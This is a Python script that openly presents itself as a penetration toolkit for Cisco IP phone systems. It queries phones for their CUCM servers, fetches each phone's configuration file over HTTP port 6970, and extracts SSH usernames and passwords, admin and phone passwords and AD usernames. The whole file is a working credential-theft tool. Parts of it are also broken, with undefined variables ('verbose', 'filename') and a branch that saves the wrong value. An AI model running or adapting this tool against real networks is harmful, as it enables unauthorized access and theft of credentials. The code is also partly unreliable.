import argparse
import requests
import re
import os.path
from bs4 import BeautifulSoup as bs
from datetime import datetime

def log(message, level):
    if level > verbosity: return
    dt = datetime.today().strftime('%Y%m%d-%H:%M:%S')
    print(f'[{dt}] {message}')

def parse_cucm(html):
    hosts = []
    
    def cucm_hosts(tag):
        if tag.name != 'b': return False
        for prev in tag.parent.find_previous_siblings('td'):
            if re.search(r'(?:cucm server|unified cm)\d', str(prev.string),
                re.IGNORECASE):
                return True

    soup = bs(html, 'html.parser')
    for el in soup(cucm_hosts):
        if not el.string: continue
        hosts.append(re.split(r'\s+', str(el.string))[0])

    return hosts

def get_config_names(CUCM_host,hostnames=None):
    config_names = []
    if hostnames is None:
        url = "http://{0}:6970/ConfigFileCacheList.txt".format(CUCM_host)
        try:
            __http_response = requests.get(url, timeout=2)
            if __http_response.status_code != 404:
                lines = __http_response.text
                print(f'Pulled ConfigFileCacheList.txt from CUCM Server {CUCM_host}')
                for line in lines.split('\n'):
                    match = re.match(r'((?:CIP|SEP)[0-9A-F]{12}\S+)',line, re.IGNORECASE)
                    if match:
                        config_names.append(match.group(1))
                        if verbose:
                            print(f'Found config_name: {match.group(1)}')
        except requests.exceptions.ConnectionError:
            print('CUCM Server {} is not responding'.format(CUCM_host))
    else:
        for host in hostnames:
            config_names.append('{host}.cnf.xml'.format(host=host))
    if config_names == []:
        return None
    else:
        return config_names

def parse_phone_hostname(html, phoneip):
    html = html.replace('\n', '').replace('\r', '')
    hostname = re.search(r'(SEP[a-z0-9]{12})', html.strip(), re.IGNORECASE)
    if hostname:
        return hostname.group(1)

def get_confpage(phoneip):
    url = f'http://{phoneip}/CGI/Java/Serviceability?' \
            + 'adapter=device.statistics.configuration'
    try:
        __http_response = requests.get(url, timeout=2)
        if __http_response.status_code == 404:
            url = f'http://{phoneip}/NetworkConfiguration'
            __http_response = requests.get(url)
        return __http_response.text
    except Exception as e:
        log(f'Failed getting conf page from {phoneip}: {e}', VERBOSE)

def scrape_phone(phoneip):
    phone_confpage = get_confpage(phoneip)
    return (parse_phone_hostname(phone_confpage, phoneip),
            parse_cucm(phone_confpage))

def search_for_secrets(cucm_hosts, phone_hostname, save_dir):
    global found_credentials
    global found_usernames
    lines = str()
    user = str()
    user2 = str()
    password = str()
    config_file = phone_hostname + '.cnf.xml'
    creds_re = re.compile(r'(<sshUserId>(\S+)</sshUserId>|' \
        + '<sshPassword>(\S+)</sshPassword>|' \
        + '<userId.*>(\S+)</userId>|' \
        + '<adminPassword>(\S+)</adminPassword>|' \
        + '<phonePassword>(\S+)</phonePassword>)')
    for cucm_host in cucm_hosts:
        if not cucm_host: continue
        url = f'http://{cucm_host}:6970/{config_file}'
        try:
            __http_response = requests.get(url, timeout=3)
            if __http_response.status_code == 404:
                if verbose:
                    print(f'Config file not found at {url}')
                continue
            else:
                lines = __http_response.text
                if save_dir:
                    try:
                        fh = open(os.path.join(save_dir,
                            f'{cucm_host}_{config_file}'), 'w')
                        fh.write(lines)
                        fh.close
                    except FileNotFoundError as e:
                        log(f'Failed saving the conf file {e}', INFO)

            for line in lines.split('\n'):
                if not (match := creds_re.search(line)): continue
                if match.group(2):
                    user = match.group(2)
                    found_usernames.append((user,filename))
                if match.group(3):
                    password = match.group(3)
                    found_credentials.append((user,password,filename))
                if match.group(4):
                    user2 = match.group(4)
                    found_usernames.append((user2,filename))
                if match.group(5):
                    user2 = match.group(5)
                    found_credentials.append(('unknown',password,filename))
        except Exception as e:
            log(f'Error during secret search at {url}: {e}', VERBOSE)
        else:
            if not verbose: continue
            if user and password:
                log(f'{config_file}\t{user}\t{password}', VERBOSE)
            elif user:
                log(f'SSH Username is {user} password was not set in {config_file}', VERBOSE)
            elif password:
                log(f'SSH Username is not set, but password is {password} in {config_file}', VERBOSE)
            elif user2:
                log(f'Possible AD username {user2} found in config {config_file}', VERBOSE)
            else:
                print(f'Username and password not set in {config_file}')
            #break

if __name__ == '__main__':
    global found_usernames
    global found_credentials

    INFO = 1
    VERBOSE = 2

    parser = argparse.ArgumentParser(
        description='Penetration Toolkit for attacking Cisco Phone Systems' \
        +' by stealing credentials from phone configuration files')
    parser.add_argument('phone', type=str,
        help='Phone IP or a file with a list of addresses')
    parser.add_argument('-v','--verbose', action='store_true',
        default=False, help='Enable Verbose Logging')
    parser.add_argument('-s','--save', type=str,
        help='Directory to save retrieved phone config files (optional)')

    args = parser.parse_args()

    phone = args.phone
    verbosity = VERBOSE if args.verbose else INFO
    save_dir = args.save
    found_credentials = []
    found_usernames = []
    file_names = ''
    hostnames = []
    phoneips = []
    
    if re.match(r'(?:\d+\.){3}\d+', phone):
        phoneips.append(phone)
    else:
        try:
            phoneips = open(phone).read().split('\n')
        except FileNotFoundError as e:
            print('Could not open list file', e)
            quit(1)

    if not len(phoneips):
        print('Got nothing to work with, provide a phone IP or a file with a list of addresses')
        quit(1)

    for phoneip in phoneips:
        (phone_hostname, cucm_hosts) = scrape_phone(phoneip)
        if not cucm_hosts:
            print(f'No CUCM hosts found in config for {phoneip}')
            continue
        if not phone_hostname:
            print(f'No hostname found for {phoneip}')
            continue
        search_for_secrets(cucm_hosts, phone_hostname, save_dir)

    if found_credentials != []:
        print('Credentials Found in Configurations!')
        for cred in found_credentials:
            print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))

    if found_usernames != []:
        print('Usernames Found in Configurations!')
        for usernames in found_usernames:
            print('{0}\t{1}'.format(usernames[0],usernames[1]))
